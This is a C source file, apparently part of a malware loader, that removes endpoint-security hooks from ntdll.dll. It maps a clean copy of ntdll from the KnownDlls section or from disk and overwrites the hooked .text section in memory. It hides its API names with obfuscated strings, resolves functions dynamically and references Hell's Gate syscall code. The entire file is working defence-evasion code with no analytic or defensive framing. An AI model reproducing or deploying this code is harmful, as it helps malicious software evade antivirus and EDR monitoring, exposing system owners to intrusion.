/*
 * NTDLL Unhooking via KnownDlls — all via dynamic API resolution
 */

#include "ntdll_unhook.h"
#include "hellsgate.h"
#include "winapi.h"
#include "obfstr.h"

typedef struct _UNICODE_STRING_NT {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_NT, *PUNICODE_STRING_NT;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG              Length;
    HANDLE             RootDirectory;
    PUNICODE_STRING_NT ObjectName;
    ULONG              Attributes;
    PVOID              SecurityDescriptor;
    PVOID              SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define OBJ_CASE_INSENSITIVE 0x00000040
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS (NTAPI *fnNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef VOID     (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING_NT, PCWSTR);

static BOOL ReplaceTextSection(PVOID ntdll_base, PVOID clean_ntdll) {
    PIMAGE_DOS_HEADER clean_dos = (PIMAGE_DOS_HEADER)clean_ntdll;
    PIMAGE_NT_HEADERS clean_nt  = (PIMAGE_NT_HEADERS)((PBYTE)clean_ntdll + clean_dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(clean_nt);

    for (WORD i = 0; i < clean_nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Name[0] == '.' && sections[i].Name[1] == 't' &&
            sections[i].Name[2] == 'e' && sections[i].Name[3] == 'x' &&
            sections[i].Name[4] == 't') {

            PVOID hooked_text = (PBYTE)ntdll_base + sections[i].VirtualAddress;
            PVOID clean_text  = (PBYTE)clean_ntdll + sections[i].VirtualAddress;
            DWORD text_size   = sections[i].Misc.VirtualSize;

            DWORD old_protect;
            if (g_Api.pVirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                memcpy(hooked_text, clean_text, text_size);
                g_Api.pVirtualProtect(hooked_text, text_size, old_protect, &old_protect);
                return TRUE;
            }
            break;
        }
    }
    return FALSE;
}

#if UNHOOK_METHOD_KNOWNDLLS
static BOOL UnhookViaKnownDlls(PVOID ntdll_base) {
    char s_ntdll[OBF_NTDLL_LEN];
    deobf(s_ntdll, OBF_NTDLL, OBF_NTDLL_LEN);
    HMODULE hNtdll = g_Api.pGetModuleHandleA(s_ntdll);
    SecureZeroMemory(s_ntdll, sizeof(s_ntdll));
    if (!hNtdll) return FALSE;

    char s1[OBF_NTOPENSECTION_LEN];
    deobf(s1, OBF_NTOPENSECTION, OBF_NTOPENSECTION_LEN);
    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)g_Api.pGetProcAddress(hNtdll, s1);
    SecureZeroMemory(s1, sizeof(s1));

    char s2[OBF_NTMAPVIEW_LEN];
    deobf(s2, OBF_NTMAPVIEW, OBF_NTMAPVIEW_LEN);
    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)g_Api.pGetProcAddress(hNtdll, s2);
    SecureZeroMemory(s2, sizeof(s2));

    char s3[OBF_NTUNMAPVIEW_LEN];
    deobf(s3, OBF_NTUNMAPVIEW, OBF_NTUNMAPVIEW_LEN);
    fnNtUnmapViewOfSection pNtUnmapViewOfSection = (fnNtUnmapViewOfSection)g_Api.pGetProcAddress(hNtdll, s3);
    SecureZeroMemory(s3, sizeof(s3));

    char s4[OBF_RTLINITUNICODE_LEN];
    deobf(s4, OBF_RTLINITUNICODE, OBF_RTLINITUNICODE_LEN);
    fnRtlInitUnicodeString pRtlInitUnicodeString = (fnRtlInitUnicodeString)g_Api.pGetProcAddress(hNtdll, s4);
    SecureZeroMemory(s4, sizeof(s4));

    char s5[OBF_NTCLOSE_LEN];
    deobf(s5, OBF_NTCLOSE, OBF_NTCLOSE_LEN);
    fnNtClose pNtClose = (fnNtClose)g_Api.pGetProcAddress(hNtdll, s5);
    SecureZeroMemory(s5, sizeof(s5));

    if (!pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection ||
        !pRtlInitUnicodeString || !pNtClose)
        return FALSE;

    WCHAR known_path[] = { '\\','K','n','o','w','n','D','l','l','s','\\',
                           'n','t','d','l','l','.','d','l','l', 0 };

    UNICODE_STRING_NT section_name;
    pRtlInitUnicodeString((PUNICODE_STRING_NT)&section_name, known_path);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, (PUNICODE_STRING_NT)&section_name,
        OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hSection = NULL;
    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    SecureZeroMemory(known_path, sizeof(known_path));
    if (!NT_SUCCESS(status))
        return FALSE;

    PVOID clean_ntdll = NULL;
    SIZE_T view_size = 0;
    status = pNtMapViewOfSection(hSection, (HANDLE)-1, &clean_ntdll,
        0, 0, NULL, &view_size, 1, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        pNtClose(hSection);
        return FALSE;
    }

    BOOL success = ReplaceTextSection(ntdll_base, clean_ntdll);

    pNtUnmapViewOfSection((HANDLE)-1, clean_ntdll);
    pNtClose(hSection);

    return success;
}
#endif

static BOOL UnhookViaDisk(PVOID ntdll_base) {
    WCHAR path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                     'S','y','s','t','e','m','3','2','\\',
                     'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hFile = g_Api.pCreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    SecureZeroMemory(path, sizeof(path));
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMapping = g_Api.pCreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_Api.pCloseHandle(hFile); return FALSE; }

    PVOID clean_ntdll = g_Api.pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!clean_ntdll) { g_Api.pCloseHandle(hMapping); g_Api.pCloseHandle(hFile); return FALSE; }

    PIMAGE_DOS_HEADER clean_dos = (PIMAGE_DOS_HEADER)clean_ntdll;
    PIMAGE_NT_HEADERS clean_nt  = (PIMAGE_NT_HEADERS)((PBYTE)clean_ntdll + clean_dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(clean_nt);

    BOOL success = FALSE;
    for (WORD i = 0; i < clean_nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Name[0] == '.' && sections[i].Name[1] == 't' &&
            sections[i].Name[2] == 'e' && sections[i].Name[3] == 'x' &&
            sections[i].Name[4] == 't') {

            PVOID hooked_text = (PBYTE)ntdll_base + sections[i].VirtualAddress;
            PVOID clean_text  = (PBYTE)clean_ntdll + sections[i].PointerToRawData;
            DWORD text_size   = sections[i].SizeOfRawData;

            DWORD old_protect;
            if (g_Api.pVirtualProtect(hooked_text, text_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
                memcpy(hooked_text, clean_text, text_size);
                g_Api.pVirtualProtect(hooked_text, text_size, old_protect, &old_protect);
                success = TRUE;
            }
            break;
        }
    }

    g_Api.pUnmapViewOfFile(clean_ntdll);
    g_Api.pCloseHandle(hMapping);
    g_Api.pCloseHandle(hFile);
    return success;
}

BOOL UnhookNtdll(void) {
#if !ENABLE_UNHOOK
    return TRUE;
#endif

    PVOID ntdll_base = GetNtdllBase();
    if (!ntdll_base) return FALSE;

#if UNHOOK_METHOD_KNOWNDLLS
    if (UnhookViaKnownDlls(ntdll_base))
        return TRUE;
#endif

    return UnhookViaDisk(ntdll_base);
}
